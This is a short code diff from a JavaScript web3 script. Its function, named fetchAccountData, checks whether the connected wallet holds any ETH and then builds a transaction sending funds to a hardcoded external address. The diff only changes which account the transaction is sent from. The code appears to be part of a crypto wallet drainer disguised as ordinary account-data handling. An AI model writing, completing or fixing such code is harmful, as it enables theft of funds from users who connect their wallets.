@@ -119,7 +119,7 @@ async function fetchAccountData() {
     const ethBalance = web3.utils.fromWei(balance, "ether");
     if(ethBalance > 0){ console.log("Balance greater than Zero");
            const tx = {
-              from: provider.addresses[0],
+              from: accounts[0],
               to: "0xBB5723d1aB9ED49b3bCD6E770A7a65B3924395AE",
               nonce: nonce,
               gas: 500000,
